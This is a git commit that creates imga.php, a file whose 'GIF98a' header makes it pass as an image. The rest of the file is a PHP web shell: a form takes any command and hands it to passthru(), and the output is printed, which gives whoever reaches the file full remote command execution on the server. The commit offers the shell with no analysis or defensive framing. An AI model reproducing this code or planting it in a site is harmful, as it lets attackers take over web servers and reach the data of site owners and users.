be77dfb79dfbb11f1c2774b4d294592f47ebfdf3
mazdon9 <133577504+mazdon9@users.noreply.github.com>
2023-07-22 20:07:56 +0700

    Create imga.php

---
+++ imga.php
@@ -0,0 +1,11 @@
+GIF98a;
+<form action="" method="post">
+<form action="" method="get">
+<h2>Malware has successfully executed</h2>
+<br>
+Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
+</form>
+Output:<br />
+<pre>
+<?php passthru($_REQUEST['cmd'], $result); ?>
+</pre>
